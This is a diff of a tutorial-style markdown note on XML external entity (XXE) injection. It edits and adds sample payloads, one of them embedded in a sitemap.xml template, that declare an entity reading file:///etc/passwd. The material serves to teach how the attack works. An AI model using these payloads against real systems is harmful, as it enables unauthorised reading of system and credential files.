@@ -65,22 +65,15 @@ We want to ensure that we also query for our target file. If we are targeting `/
 Let's go back to our example quickly.![[Screenshot From 2025-03-06 16-55-20.png]]
 
 We'll copy our above payload and compare it to the example from our smaple file(sitemap.xml)
-
+evil.xml:- (i.e above eg payload )
 ```
-
-
+<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
-
-        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <urlset>
-
-    <url>
-
-        <loc>&xxe;</loc>
-
-    </url>
-
+    <url>
+        <loc>&xxe;</loc>
+    </url>
 </urlset>
 ```
 
@@ -101,6 +94,41 @@ Since we know the application will display a list of URLs, like "test" and "test
 Once we make this change, we’ll save the file.
 
 Instead of overwriting the original, I highly recommend saving it as a separate file to preserve the original template in case something goes wrong.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+
+<?xml-stylesheet type="text/xsl" href="/sitemap.xsl"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1">
+
+    <url>
+
+        <loc>https://www.google.com/</loc>
+
+        <priority>1.0</priority>
+
+    </url>
+
+    <url>
+
+        <loc>https://www.google.com/test</loc>
+
+        <priority>1.0</priority>
+
+    </url>
+
+    <url>
+
+        <loc>https://www.google.com/test-2</loc>
+
+        <priority>1.0</priority>
+
+    </url>
+
+</urlset>
+```
 
 Now, let's go back.
 
